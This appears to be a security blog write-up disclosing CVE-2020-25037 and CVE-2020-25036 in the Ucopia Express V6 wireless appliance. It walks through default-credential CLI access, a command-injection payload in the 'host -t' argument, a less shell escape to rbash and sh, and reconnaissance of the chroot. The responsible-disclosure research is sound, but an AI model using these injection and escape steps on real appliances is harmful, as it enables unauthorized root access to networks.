
  
<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="siteBaseUrl" content="https://blog.globadis.com/">
    <meta name="author" content="Globadis">
    <meta name="description" content="Globadis works.">
    <meta name="keywords" content="blog,globadis,security,hack,cve">
    <meta name="generator" content="Hugo 0.54.0" />
    <title>
        
           
               Ucopia V6 : Multiple CVE used to root the host &vert; Globadis works
           
        
    </title>
    <meta name="description" content="Ucopia V6 : Multiple CVE used to root the host - Globadis works.">
    <meta itemprop="name" content="Ucopia V6 : Multiple CVE used to root the host">
    <meta itemprop="description" content="Ucopia V6 : Multiple CVE used to root the host - Globadis works.">
    <meta property="og:title" content="Ucopia V6 : Multiple CVE used to root the host">
    <meta property="og:description" content="Ucopia V6 : Multiple CVE used to root the host - Globadis works.">
    <meta property="og:image" content="/images/padlock.png">
    <meta property="og:url" content="https://blog.globadis.com/blog/ucopia-v6-multiple-cves-root/">
    <meta property="og:site_name" content="Globadis works">
    <meta property="og:type" content="article">

    


    <script src="/modernizr-simple.js"></script>

    
    <link href="/blog/ucopia-v6-multiple-cves-root/" rel="alternate" type="application/rss+xml" title="Globadis works" />
    <link href="/blog/ucopia-v6-multiple-cves-root/" rel="feed" type="application/rss+xml" title="Globadis works" />
    

    

    <link rel="stylesheet" href="https://blog.globadis.com/theme.css">

    

    
        
    
</head>

<body class="bilberry-hugo-theme">

    
    <nav>

    <div class="container">
        <ul class="topnav">
            
                
                    <li><a href="https://localisio.fr" target="_blank">Localisio</a></li>
                
            
                
                    <li><a href="https://passwords.globadis.com" target="_blank">PSK Generator</a></li>
                
            
        </ul>

        
    </div>
</nav>


    
<header>

    <div class="container">
        <div class="logo">
            <a href="/" class="logo">
                
                <img src="/images/padlock.png" alt="">
                

                <span class="overlay"><i class="fa fa-home"></i></span>
            </a>
        </div>
        <div class="titles">
            <h3 class="title"><a
                    href="/">Globadis works</a></h3>
            
            <span class="subtitle">NetSec, hacking and other stuff</span>
            
        </div>

        

        
            <div class="toggler">
                
                <i class="fa fa-bars" aria-hidden="true"></i>
            </div>
        </div>
</header>


    <div class="main container">
        
    <div class="article-wrapper u-cf single">
        
            <a class="bubble" href="https://blog.globadis.com/blog/ucopia-v6-multiple-cves-root/">
    <i class="fas fa-fw fa-pencil-alt"></i>
</a>

<article class="default article">
    

    <div class="content">
    <h1 class="article-title">
        <a href="https://blog.globadis.com/blog/ucopia-v6-multiple-cves-root/">
            Ucopia V6 : Multiple CVE used to root the host
        </a>
    </h1>

    <div class="meta">
        
            
                <span class="date moment">2021-03-01</span>
            
        

        

        

        
            <span class="author">
                
                
                    <a href="https://blog.globadis.com/author/globadis/">Globadis</a>
                
            </span>
        
    </div>

    
        

<p>Something I hate in my job is that sometimes I have a problem with an appliance,
and no easy mean to diagnose it. It&rsquo;s already bad enough when it&rsquo;s because
those are designed from scratch to be restricted (Looking at you, Cisco and your
god-damned IOS), but it&rsquo;s worst when they are running on a standard Linux/Unix
host to which we don&rsquo;t have access. All the commands I need are right there, I know
it, I know what I need to use, where to find it, but I can&rsquo;t because the editor
does not want its users to access operating system underneath.</p>

<p>Even though they present this as a security feature, I always think it&rsquo;s either
a lazy take on security (they have not properly managed to secure the OS and don&rsquo;t
want us to pry into it) or a mean to force us to call for their support center
when we have a problem (and of course, pay the associated fee).</p>

<p>I usually kinda let it slide when it&rsquo;s SaaS or other kind of &ldquo;rented appliance&rdquo;
which we do not purchase, but pay regularly for. But when it&rsquo;s a physical (or
virutal) device) we purchase first and install in our datacenter&hellip; Now that really
bothers me. Why on earth should I trust that you, dear editor, is better suited
to handle the security of the OS than me ? Why can&rsquo;t I even look at how it&rsquo;s
configured ?</p>

<p>So, each time I have a problem with this kind of equipment, it ends the same way :
As soon as I have a bit a spare time (shortened lunch breaks), I try to pry into
the appliance.</p>

<p>Until now, I kept my findings to myself in order to keep my edge on the editors
in this neverending race. But now I think it&rsquo;s time to let it out, so</p>

<ul>
<li>It can benefit other sysadmins struck in the same issues I have</li>
<li>Responsible disclosure allows for the editor to patch their device, lowering
the risk to their customers</li>
<li>I can us this as an example to show you the mindset of an attacker on a real
target.</li>
</ul>

<p>So buckle up, we&rsquo;re going on a ride !</p>

<h1 id="our-target-today-ucopia-express-wireless-appliance">Our target today : Ucopia Express wireless appliance</h1>

<p>In a few words, Ucopia Express is an easy to install and use wireless &ldquo;guest&rdquo;
network manager. It can do more than that, but guest access is it&rsquo;s basic intended
purpose. So it can hand different networks, profiles and policies, display captive
portals for local account authentication or connect to an external (radius or LDAP)
service for authentication.</p>

<p>As you can guess, this is running on a Linux host but we&rsquo;re not allowed in the
OS and have to deal with either the web application or a CLI for configuration or
debugging.</p>

<p>Our starting point here is logged in the CLI with the user <code>admin</code>. This could
and should be considered a bit like cheating, as it is an authenticated write-capable
user, but it&rsquo;s really not. Ucopia devices are all shipped with the same admin password,
which is common knowledge at this point (See CVE-2017-17743). And even if through the
Web-based installation &amp; configuration process, you are asked to change the admin
password, for some unfathomable reason, it <em>only</em> changes the WebUI admin password
and <em>not</em> the CLI password, which tends to stay the default one for years.</p>

<p>So at this point, being logged in as <code>admin</code> in CLI really should be treated as
unauthenticated access.</p>

<p>Target identification :</p>

<pre><code>***** ***** ***** ***** ***** ***** *****
* Production name      UV2000
* Hardware version     VMWARE
* Serial number        &lt;Redacted&gt;
* License              Express 500
* Current build        18010105
* Current version      6.0.5
* Last upgrade         update_6.0-b18010105
* Maintenance validity &lt;Redacted&gt;
***** ***** ***** ***** ***** ***** *****
</code></pre>

<p>As we can see right from the login banner, we&rsquo;re in a controlled environment :</p>

<pre><code>Type 'help' to display the CLI usage help.
Type '?' to display the available commands.
Type a command name followed by '?' to display specific help about this command.

&gt; ?

accessLimitationAdmin       List / Add / Remove limitations to access Web Administration Tools
activateLicense             Install license. In case of virtual appliance, the activation key must be specified
addFTPAccount               Add an FTP account
addSubnet                   Add incoming or outgoing subnet
addZone                     Add a zone
[...]
</code></pre>

<p>Historically, I knew a bit about the architecture of Ucopia&rsquo;s CLI environment.
So we&rsquo;re in a CLI, which runs in a (restricted) shell, which is chrooted. That seems
like a long shot to escape all of these layers of security, but let&rsquo;s take it one step at a time.</p>

<h1 id="escaping-cli">Escaping CLI</h1>

<p>First things first, we won&rsquo;t be able to get very far if we&rsquo;re unable to escape this restricted
command line interface. Let&rsquo;s take a look at the available commands :</p>

<pre><code>accessLimitationAdmin       List / Add / Remove limitations to access Web Administration Tools
activateLicense             Install license. In case of virtual appliance, the activation key must be specified
addFTPAccount               Add an FTP account
addSubnet                   Add incoming or outgoing subnet
addZone                     Add a zone
adminInterface              Configure the network parameters of the admin interface
adminSessionTimeout         close admin session after X minutes of inactivity
applyAllUpdates             Apply all updates available in FTP directory
applyUpdate                 Apply one update
arp                         Show ARP cache
arping                      Send an ARP request to a neighbour host
bzip2                       A block-sorting file compressor
deleteFTPAccount            Delete an FTP account
deleteZone                  Delete a zone
delSubnet                   Delete a subnet
dhclient                    Get DHCP distributed IP address
dhcpLease                   Manage fixed DHCP leases
dnsRedirect                 enable/disable DNS redirection
dnsSetServers               Configure the DNS servers
dnsSpoofing                 enable/disable DNS spoofing
enableAutoUpdate            Enable/disable auto update process
enableLogLevel              Change logs level
exit                        Exit this CLI session
filtering                   Open full access on all incoming networks or restore default behavior
freeradiusGenerateNewDHKey  Generate a new Diffie-Hellman key with length specified for the local RADIUS service and restart it.
freeradiusStatusCheck       Change the way FreeRADIUS check server status
halt                        Shut down the controller
hashedPassword              enable/disable hashed password for local user accounts
help                        Display an overview of the CLI syntax
host                        Look up host names using domain server
installCertificate          Install a HTTPS or Radius certificates from a supplied URL
installLicense              Install license from a supplied link
interface                   Show network interfaces configurations
ipRouteGet                  get a single route
keyboard                    Change the keyboard layout
ldapSearch                  Opens a connection to an LDAP controller, binds to it, and performs a search using a filter
less                        Display output one screen at a time
listFTPAccount              List available FTP accounts
listUpdates                 List available updates
listZones                   Show zone list
ls                          List files and directories
manageDhcpLeases            Manage DHCP leases
modifyFTPAccount            Modify an FTP account
modifyNativeIP              Modify controller IP address and netmask of incoming or outgoing native VLAN
modifyZone                  Modify a zone
mysqlCheck                  Check mysql DB
mysqlDbSize                 mysql DB size
mysqlReadSessions           Read sessions table
netstat                     Show network status
nslookup                    queries Internet domain name servers
passwd                      Modify administrator password
ping                        Ping the remote host
ps                          displays information about a selection of the active processes
radiusCipherList            enable/disable SSLv3 support for RADIUS.
reboot                      Reboot the controller
restoreCertificate          Restore certificates
restoreConfiguration        Restore a remote configuration backup
rm                          Remove files or directories
scp                         Secure copy
service                     Configure the state of service
showDhcpLeases              Show DHCP leases
showLogs                    View controller logs
showRoute                   Show network routes
ssh                         OpenSSH client
staticRoutes                Manage static routes
summary                     Show the controller characteristics summary
supportAccess               Give access to UCOPIA support
tcpdump                     Dump traffic on a network
telnet                      User interface to the TELNET protocol
traceroute                  Print the route packets take to network host
troubleshoot                Execute diagnostic tests to find network errors
tunnel                      Mount or unmount a tunnel for support team access
userAgentFilter             enable/disable a strict filtering on browser User Agent for the controller web server
webCipherSuite              normal/low/high protocol support level on the web server.
wget                        The non-intractive network downloader
windowsDomainRegisteredMAC  Manage Registered MAC address used for devices authentication
</code></pre>

<p>OK so most of these are handcrafted commands, maybe using some bash or python underneath with
a very restriced set of parameters. It seems less likely to escape from these commands than
from the handful of available shell commands which we could guess are the real unchecked commands.</p>

<hr />

<p><details>
  <summary>That prove to be, however possible, quite a tedious process. There is CVE-2020-25037 related to that,
but not the one I exploited to actually root the device. Unroll if you want to read more about it.</summary></p>

<p>There are some shell commands that look quite promising.</p>

<ul>
<li><code>less</code> is known to allow for external command calls if not properly configured</li>
<li><code>wget</code> will be of a great help to fetch external resources if needed</li>
<li><code>scp</code> can also be misconfigured to keep file permissions while copying them (and you don&rsquo;t want the user to execute it&rsquo;s scripts, trust me)</li>
<li><code>tcpdump</code> might also be of use if we get it to execute files for us</li>
</ul>

<h2 id="trying-to-bang-out-of-less">Trying to bang out of less</h2>

<p>Let&rsquo;s begin with the easiest way out : calling an external command from <code>less</code>, as can be done with <code>vi</code>.
This is often overlooked and most often than not even allows to run python or perl directly from there.
In <code>less</code>, this is done by typing an exclamation point while reading :</p>

<pre><code>&gt; less /etc/passwd
WARNING: terminal is not fully functional
root:x:0:0::/:/bin/sh
admin:x:1002:1000::/home/admin:/bin/rbash
/etc/passwd (END)
!
Command not available  (press RETURN)
</code></pre>

<p>Damn it, they thought to disable that. As soon as I type the bang, I get this &ldquo;Command not available&rdquo;.</p>

<h2 id="trying-to-scp-executable-files">Trying to scp executable files</h2>

<p>As we can see, we can only write in a <code>~/data</code> directory and we don&rsquo;t have any flow redirection options available
to create our own files, so we will need to upload them. As we don&rsquo;t have <code>chmod</code>
at hand, we can&rsquo;t make them executable</p>

<p>Another neat way to further attacks on this type of device is by using <code>scp</code> to upload a script or binary file.
We don&rsquo;t have access to <code>chmod</code> to set those executables, but fortunately
<code>scp</code> keeps file permissions by default so we may be able to infiltrate our little friends ready to go.</p>

<pre><code>[user@device ~]# touch test.sh
[user@device ~]# chmod +x test.sh
[user@device ~]# ls -las test.sh
0 -rwxr-xr-x 1 user user 0 Aug  3 12:38 test.sh
</code></pre>

<p>Our mock payload is ready, let&rsquo;s transfer it</p>

<pre><code>&gt; scp user@1.1.1.1:~/test.sh data/
user@1.1.1.1's password:
test.sh                                                                                                                                                                      100%    0     0.0KB/s   00:00
&gt; ls data
total 0
-rwxr-xr-x 1 admin admin 0 Aug  3 07:39 test.sh
</code></pre>

<p>That&rsquo;s a big oof, after being forbidden to bang out of less I did not thought I could get away
with uploading executables that easily.</p>

<p>Uploading executables and/or binaries in itself is quite bad, but might not
be sufficient to be called a security vulnerability, as we currently have no way to
execute them. But could we ?</p>

<h2 id="cve-2020-25037-arbitrary-code-execution-using-admin-privileges">CVE-2020-25037 : Arbitrary code execution using admin privileges</h2>

<p>First, let&rsquo;s add some commands in our test.sh file so we can know if it&rsquo;s being executed :</p>

<pre><code>#!/bin/sh
ls -las
cd /tmp
ls -las
cd /etc/
ls -las
cat /etc/passwd
echo 'pwn'
</code></pre>

<p>Nothing fancy here, some <code>cd</code> to see if we&rsquo;re able to change directories, some
<code>ls</code> to confirm we moved, a <code>cat</code> to see if we&rsquo;re running a shell or still in CLI
somehow, and a bit of <code>echo</code> for fun&rsquo;s sake. We upload this in our <code>~/data</code>
directory using <code>scp</code> as shown above.</p>

<p>Let&rsquo;s try to exploit local commands to execute our file.</p>

<pre><code>&gt; host test server ; ls -las
                   ^

&gt; host test server | ls -las
                   ^

&gt; host test server &amp;&amp; ls -las
                   ^

&gt; host test $(ls)
            ^
server  Domain name or IP address

&gt; host test \`ls\`
            ^
server  Domain name or IP address
</code></pre>

<p>As I reasonnably expected, any of the easy ways to execute commands by
appending our stuff trying to pass them as parameters is not going to work.
Good point for Ucopia there, this would have been a catastrophic overlook.</p>

<p>Let&rsquo;s assume command arguments or parameters are somehow encapsulated in quotes,
and try to escape from this by purring half-opened strings in our parameters :</p>

<pre><code>&gt; host test &quot;server
host: couldn't get address for 'server': not found
&gt; host test &quot;&amp;server
            ^
server  Domain name or IP address

&gt; host test &quot;\&amp;server
            ^
server  Domain name or IP address
</code></pre>

<p>We&rsquo;re getting a bit further, as the lone double-quote seems taken in the parameter.
Unfortunately, there seems to be another check on those parameters to ensure they
are indeed hostnames and server names. Maybe we can find another field/option which
would be less filtered. Looking at the help of <code>host</code> we can see :</p>

<pre><code>&gt; host ?

host &lt;hostname&gt; [-t querytype] [-v verbose] [-r recursion_off] [-d debugging] [-l list] [-T tcp] [server]
 Look up host names using domain server

    hostname        the host name
 -t querytype       specify a particular querytype of information to be looked up []
 -v verbose         use 'verbose' format for printout [n]
 -r recursion_off   turn off recursion in the request [n]
 -d debugging       turn on debugging [n]
 -l list            list a complete domain [n]
 -T tcp             enables TCP/IP mode [n]
    server          specify a particular server to query []
</code></pre>

<p>We don&rsquo;t have a lot of room to wiggle here : most of the options are y/n switches, most likely
heavily enforced, except for <code>-t querytype</code>. We might have to look for another command, but let&rsquo;s
try to pass exotic parameters to <code>querytype</code> :</p>

<pre><code>&gt; host -t ;ls host server
          ^
querytype  Non-empty string ( ';' or '|' are not allowed )

&gt; host -t &amp;&amp;ls host server
host: invalid type: &amp;&amp;ls

&gt; host -t &amp;ls host server
host: invalid type: &amp;ls

&gt; host -t $(ls) host server
host: invalid type: $(ls)

&gt; host -t \$(ls) host server
host: invalid type: \$(ls)

&gt; host -t \&amp;ls host server
host: invalid type: \

ls: cannot access host: No such file or directory
ls: cannot access server: No such file or directory
</code></pre>

<p>Now we&rsquo;re talking ! It seems like <code>\&amp;</code> did the trick and lets us execute <code>ls host server</code> after the
<code>host</code> call. So we are able to call a command with up to 2 parameters.</p>

<p>We found a little crack in the security, now let&rsquo;s put a prybar in it and force it open with our test script :</p>

<pre><code>&gt; host -t \&amp;data/test.sh host server
host: invalid type: \

total 16
4 drwxr-xr-x 4 root  admin 4096 Jul 24 02:54 .
4 drwxr-xr-x 3 root  root  4096 Jul 24 02:54 ..
4 drwxr-xr-x 2 admin admin 4096 Sep  1 07:39 data
4 drwxr-xr-x 2 root  admin 4096 Jul 24 02:54 .ssh
total 12
4 drwxrwxrwt  2 root  root  4096 Aug 10 12:20 .
4 drwxr-xr-x 11 root  root  4096 Jul 24 02:54 ..
0 srwxrwxrwx  1 root  root     0 Jul 24 02:55 chroothole
4 -rw-r--r--  1 admin admin    5 Aug  3 12:52 tcpdump.bpf
total 88
 4 drwxr-xr-x  4 root root  4096 Jul 24 02:54 .
 4 drwxr-xr-x 11 root root  4096 Jul 24 02:54 ..
12 drwxr-xr-x  2 root root 12288 Jul 24 02:55 clish
 4 -rw-r--r--  1 root root    24 Jul 24 02:54 group
 4 -rw-r--r--  1 root root     9 Jul 24 02:54 host.conf
 4 -rw-r--r--  1 root root  1006 Jul 24 02:54 hosts
 4 -rw-r--r--  1 root root  1747 Jul 24 02:54 inputrc
 4 -rw-r--r--  1 root root  2945 Jul 24 02:54 localtime
 4 -rw-r--r--  1 root root   381 Aug  3 05:12 motd
 4 -rw-r--r--  1 root root   513 Jul 24 02:54 nsswitch.conf
 4 drwxr-xr-x  2 root root  4096 Jul 24 02:54 pam.d
 4 -rw-r--r--  1 root root    64 Jul 24 02:54 passwd
 4 -rw-r--r--  1 root root   827 Jul 24 02:54 profile
 4 -rw-r--r--  1 root root  2932 Jul 24 02:54 protocols
 4 -rw-r--r--  1 root root    21 Jul 24 02:54 resolv.conf
20 -rw-r--r--  1 root root 19605 Jul 24 02:54 services
root:x:0:0::/:/bin/sh
admin:x:1002:1000::/home/admin:/bin/rbash
pwn
</code></pre>

<p>Bingo ! Here is our little friend CVE-2020-25037, we can execute any binary we upload on
the appliance.</p>

<p>However, I&rsquo;m not going to use this to further my exploitation as the process is tedious.
In order to execute anything, I&rsquo;m likely going to have to :</p>

<ul>
<li>Upload executable binaries to the device</li>
<li>Upload associated libraries (I don&rsquo;t think the chroot conveniently contains all libraries I may need)</li>
<li>Create a script to alter environmental variables and call the binaries</li>
<li>Upload this script to the device</li>
<li>Execute it</li>
</ul>

<p>As searching for vulnerabilities needs quite a lot of trial and error, and having
to go through all of these steps each time is going to take me more time than I
intended to give it, I prefer to try to escape the CLI and get into an interactive
shell for.</p>

<p>However, for exploitation purposes in the wild, this is likely to be the preferred
vulnerability. We could upload any payload to try some classic buffer overflows and
whatnots, so I&rsquo;d say this is the most dangerous vulnerability in today&rsquo;s show.</p>

<p>Let&rsquo;s get back a bit an try to escape CLI.
</details></p>

<hr />

<p>So, shell commands were an interesting lead but too time consuming for me.</p>

<p>Out of all the handcrafted commands, two in particular got my attention : <code>showDhcpLeases</code> and
<code>showLogs</code>. Because logs are often very verbose, displaying them in a terminal almost always
requires some form of flow control, usually using <code>less</code> or <code>more</code> as handlers. And every time
we use <code>less</code> or <code>more</code>, there is a chance that command processing was not disabled. Let&rsquo;s take
a deeper look on these commands :</p>

<pre><code>&gt; showLogs

showLogs [type] [-n number] [-d day]
 View controller logs

    type     Word to search (such as radius, dhcp, etc.) or a pattern with alphabet, numeric, space and characters in following single quotes: '.*+|()[]{},:;\' (use '\\\\|' to escape a pipe) []
 -n number   Search in the last 'number' line log events [1000]
 -d day      Search in the specified day's log events (0 = today, 1 = yesterday, interval of days = x-y; A day starts at 6:25AM) [0]
</code></pre>

<p>No flow control available here&hellip; So we&rsquo;re just displaying a shitload of log lines rigth to the
admin&rsquo;s face ?
Damn, I hope I never need to use this ! Let&rsquo;s see if <code>showDhcpLeases</code> is better :</p>

<pre><code>&gt; showDhcpLeases

showDhcpLeases [pipe_action] [grep_pattern]
 Show DHCP leases

  pipe_action    A piped action (less|grep) []
  grep_pattern   A grep pattern (do not support ';' character) []

</code></pre>

<p>Now we might be going somewhere ! We can pipe the output to either <code>less</code> or <code>grep</code>. <code>grep</code>
at least seems controlled for semi-colons, which is bad for us, but let&rsquo;s take a look at <code>less</code>
first :</p>

<pre><code>&gt; showDhcpLeases less
DHCP Leases
WARNING: terminal is not fully functional
-  (press RETURN)
</code></pre>

<p>That&rsquo;s an odd warning, but I don&rsquo;t care much. We now have our standard <code>less</code> screen displaying
some dhcp leases, as expected.</p>

<pre><code>[...]
lease &lt;Redacted&gt; {
  starts 4 2020/07/23 15:32:24;
  ends 4 2020/07/23 16:30:21;
  tstp 4 2020/07/23 16:30:21;
  cltt 4 2020/07/23 15:32:25;
:
</code></pre>

<p>Let&rsquo;s try to use a command with <code>less</code>&rsquo;s bang :</p>

<pre><code>!ls
data
!done  (press RETURN)
!whoami
/bin/rbash: whoami: command not found
</code></pre>

<p>Nice ! Commands are not disabled in this implementation of less (as they were in the native
shell version, see above). So we probably can try &hellip;</p>

<h1 id="cve-2020-25036-escaping-from-cli-environment-through-unprotected-less-command">CVE 2020-25036 : Escaping from CLI environment through unprotected less command</h1>

<pre><code>!rbash
rbash-4.3$ 
</code></pre>

<p>There we are, one step closer to our goal : we now have access to <code>rbash</code>.</p>

<hr />

<p><details>
  <summary>
Now there are lots we can do with <code>rbash</code>, or a least lots more than what we could in CLI,
but&hellip; not quite enough, or at least not easily enough.
 </summary></p>

<p><code>rbash</code> is a Restricted shell. that means it&rsquo;s intended to forbid user from using most of
the commands he could use to do anything malicious, as we can see :</p>

<pre><code>rbash-4.3$ cd data
rbash: cd: restricted
rbash-4.3$ ls data/
test.sh
rbash-4.3$ ./data/test.sh
rbash: ./data/test.sh: restricted: cannot specify `/' in command names
</code></pre>

<p>No directory change allowed, no cross-directory calls either&hellip; This was expected, and
that&rsquo;s why we need to use another interpreter if possible
</details></p>

<hr />

<p>Fortunately, looking at <code>/etc/passwd/</code> file shows us that <code>/bin/sh</code> is available too :</p>

<pre><code>rbash-4.3$ cat /etc/passwd
root:x:0:0::/:/bin/sh
admin:x:1002:1000::/home/admin:/bin/rbash
rbash-4.3$ ls -las /bin
total 1212
   4 drwxr-xr-x  2 root root    4096 Jul 24 02:54 .
   4 drwxr-xr-x 11 root root    4096 Jul 24 02:54 ..
1080 -rwxr-xr-x  1 root root 1105840 Mar 25  2019 rbash
 124 -rwxr-xr-x  1 root root  124492 Nov  8  2014 sh
rbash-4.3$ sh
$
</code></pre>

<p>Being &ldquo;locked&rdquo; in a <code>rbash</code> but with a <code>sh</code> interpreter at hand and no way to
forbid us to use it is odd. I guess they forgot to remove it, or they use the
<code>root</code> account sometimes for maintenance and need more than <code>rbash</code> ?</p>

<p>Anyway, just switch to <code>sh</code> and we will have a bit more flexibility (changing directories, calling execs from other directories, etc)</p>

<p>Now is time for a little bit of recon : we escaped a CLI, but where are we exactly ?
Judging by the <code>/etc/passwd</code> file and <code>/etc/</code> directory, it is fair to assume we&rsquo;re
in a chroot. We can verify this assumption by looking at <code>/proc/1/mountinfo</code> :</p>

<pre><code class="language-angelscript">$ ls -las /etc/
total 88
 4 drwxr-xr-x  4 root root  4096 Jul 24 02:54 .
 4 drwxr-xr-x 11 root root  4096 Jul 24 02:54 ..
12 drwxr-xr-x  2 root root 12288 Jul 24 02:55 clish
 4 -rw-r--r--  1 root root    24 Jul 24 02:54 group
 4 -rw-r--r--  1 root root     9 Jul 24 02:54 host.conf
 4 -rw-r--r--  1 root root  1006 Jul 24 02:54 hosts
 4 -rw-r--r--  1 root root  1747 Jul 24 02:54 inputrc
 4 -rw-r--r--  1 root root  2945 Jul 24 02:54 localtime
 4 -rw-r--r--  1 root root   381 Aug 31 05:12 motd
 4 -rw-r--r--  1 root root   513 Jul 24 02:54 nsswitch.conf
 4 drwxr-xr-x  2 root root  4096 Jul 24 02:54 pam.d
 4 -rw-r--r--  1 root root    64 Jul 24 02:54 passwd
 4 -rw-r--r--  1 root root   827 Jul 24 02:54 profile
 4 -rw-r--r--  1 root root  2932 Jul 24 02:54 protocols
 4 -rw-r--r--  1 root root    21 Jul 24 02:54 resolv.conf
20 -rw-r--r--  1 root root 19605 Jul 24 02:54 services

$ cat /proc/1/mountinfo
14 19 0:14 / /sys rw,nosuid,nodev,noexec,relatime - sysfs sysfs rw
15 19 0:3 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
16 19 0:5 / /dev rw,relatime - devtmpfs udev rw,size=10240k,nr_inodes=255165,mode=755
17 16 0:11 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=000
18 19 0:15 / /run rw,nosuid,noexec,relatime - tmpfs tmpfs rw,size=205828k,mode=755
19 0 8:2 / / rw,relatime - ext4 /dev/sda2 rw,errors=remount-ro,data=ordered
20 18 0:16 / /run/lock rw,nosuid,nodev,noexec,relatime - tmpfs tmpfs rw,size=5120k
21 14 0:17 / /sys/fs/pstore rw,relatime - pstore pstore rw
23 18 0:19 / /run/shm rw,nosuid,nodev,noexec,relatime - tmpfs tmpfs rw,size=826160k
24 14 0:20 / /sys/fs/fuse/connections rw,relatime - fusectl fusectl rw
25 19 8:5 / /var rw,relatime - ext4 /dev/sda5 rw,data=ordered
28 14 0:21 / /sys/fs/cgroup rw,relatime - tmpfs cgroup rw,size=12k
29 18 0:22 / /run/cgmanager/fs rw,relatime - tmpfs cgmfs rw,size=100k,mode=755
31 28 0:32 / /sys/fs/cgroup/systemd rw,nosuid,nodev,noexec,relatime - cgroup systemd rw,release_agent=/usr/lib/i386-linux-gnu/systemd-shim-cgroup-release-agent,name=systemd
32 18 0:33 / /run/user/1002 rw,nosuid,nodev,relatime - tmpfs tmpfs rw,size=205828k,mode=700,uid=1002,gid=1000
26 25 0:3 / /var/chroot/proc rw,relatime - proc none rw
27 25 8:2 /usr/share/ucopia/clish /var/chroot/etc/clish rw,relatime - ext4 /dev/sda2 rw,errors=remount-ro,data=ordered
</code></pre>

<p>According to this last line, we&rsquo;re chrooted somewhere under <code>/var/chroot/</code> on the host OS.
That&rsquo;s nice to know, and even though this is not going to help us for now,
we&rsquo;re going to need this intel for later.</p>

<p>Usually, the best ways to escape a chroot are :</p>

<ul>
<li>Exploiting kernel bugs</li>
<li>Exploiting root-owned binaries/libraries with SUID set</li>
<li>Remounting chroot on a link to host&rsquo;s root</li>
</ul>

<p>Unfortunately, I was not able to perform any of above. Root-owned binaries and
libraries seem copied instead of hard-linked from host OS so I&rsquo;m not going
anywhere meaningful with this approach for now. There may be something more to
find this way, but instead of pursuing into this lead, I used my prior
knowledge of Ucopia&rsquo;s infrastructure and existing CVE to focus my attention on
what will most likely be my way out : the <code>/usr/bin/chroothole_client</code> executable.</p>

<h2 id="what-is-chroothole-client">What is chroothole_client ?</h2>

<p>When you design a chrooted system, most of the point is keepign the user to its pants.
This is the case when you want to allow a user to drop files on your server but nothing
more, or when you want to allow a friend to bounce on your machine for SSH tunelling
but are too paranoid to let him have a full user account : you restrict all you can and let
the bare minimum for basic intended functionality.</p>

<p>When you&rsquo;re designing a chrooted environment for advanced users to manage part of the
system, like in the case at hand, your user needs a lot of privileges. Using CLI, we can
setup interfaces, routes, DNS ; we can use traceroute and tcpdump for debugging purposes,
and much more. Though for some commands, the easiest way is to simply copy the binary into
the chrooted environment, for some other (mostly those needing write permissions on the
system), you need to properly parse the user input before passing it to the backend binary
to ensure he&rsquo;s not trying to, say, root the system for example. But we all know that
<em>never</em> happens ;)</p>

<p>So for Ucopia, this led to the development of <code>chroothole_client</code> : An executable which,
quite predictably according to its name, allows the client to run some commands through
a hole in the chroot. Now, this hole has to be the thinnest possible and heavily monitored
so not to let the user pass anything through it.</p>

<h2 id="how-to-exploit-chroothole-client">How to exploit chroothole_client</h2>

<p>I guess we could <code>scp</code> the <code>chroothole_client</code> out of the machine, decompile it and look for
clues on how to bypass it, but let&rsquo;s try to use it the intended way. That is, when the user
in CLI calls for example for a network interface change, there has to be something sent
through the hole to the host OS for actual modification, and if the parameters are only checked
at CLI-level, we can then forge our own unrestricted calls to <code>chroothole_client</code>.</p>

<p>Let&rsquo;s take a look at how are CLI command defined and how they interact with <code>chroothole_client</code>.</p>

<p>All the commands used in ucopia <code>clish</code> binary use xml definitions located under the chrooted
<code>/etc/clish/</code> directory.</p>

<pre><code class="language-ls">$ ls -las /etc/clish/
total 276
12 drwxr-xr-x 2 root root 12288 Jul 24 02:55 .
 4 drwxr-xr-x 4 root root  4096 Jul 24 02:54 ..
 4 -rw-r--r-- 1 root root  3143 Jul 22 18:45 accessLimitationAdmin.xml
 4 -rw-r--r-- 1 root root  2499 Jul 22 18:45 activateLicense.xml
 4 -rw-r--r-- 1 root root  3588 Jul 22 18:45 addSubnet.xml
 8 -rw-r--r-- 1 root root  5423 Jul 22 18:45 admin_iface.xml
 4 -rw-r--r-- 1 root root  1028 Jul 22 18:45 arping.xml
 4 -rw-r--r-- 1 root root   651 Jul 22 18:45 arp.xml
 4 -rw-r--r-- 1 root root   843 Jul 22 18:45 bzip2.xml
 4 -rw-r--r-- 1 root root  1078 Jul 22 18:45 delSubnet.xml
 4 -rw-r--r-- 1 root root   625 Jul 22 18:45 dhclient.xml
 4 -rw-r--r-- 1 root root   912 Jul 22 18:45 dhcp_lease.xml
 4 -rw-r--r-- 1 root root  1227 Jul 22 18:45 dnsredirect.xml
 4 -rw-r--r-- 1 root root   745 Jul 22 18:45 dnsSetServers.xml
 4 -rw-r--r-- 1 root root  2027 Jul 22 18:45 dnsspoofing.xml
 4 -rw-r--r-- 1 root root  1785 Jul 22 18:45 filtering.xml
 4 -rw-r--r-- 1 root root   688 Jul 22 18:45 freeradius_generate_new_dh_key.xml
 4 -rw-r--r-- 1 root root  1204 Jul 22 18:45 freeradius_status_check.xml
 4 -rw-r--r-- 1 root root  1569 Jul 22 18:45 global-commands.xml
 4 -rw-r--r-- 1 root root  1151 Jul 22 18:45 halt.xml
 4 -rw-r--r-- 1 root root  1823 Jul 22 18:45 host.xml
 4 -rw-r--r-- 1 root root   562 Jul 22 18:45 interface.xml
 4 -rw-r--r-- 1 root root   549 Jul 22 18:45 keyboard.xml
 4 -rw-r--r-- 1 root root  1007 Jul 22 18:45 ldap.xml
 4 -rw-r--r-- 1 root root   523 Jul 22 18:45 less.xml
 4 -rw-r--r-- 1 root root   520 Jul 22 18:45 ls.xml
 4 -rw-r--r-- 1 root root  1791 Jul 22 18:45 manageCertificates.xml
 4 -rw-r--r-- 1 root root  1641 Jul 22 18:45 managedhcpleases.xml
 4 -rw-r--r-- 1 root root  3076 Jul 22 18:45 manageFTPAccount.xml
 4 -rw-r--r-- 1 root root   648 Jul 22 18:45 manageLicense.xml
 4 -rw-r--r-- 1 root root  1741 Jul 22 18:45 manageUpdates.xml
 4 -rw-r--r-- 1 root root  3102 Jul 22 18:45 manageZones.xml
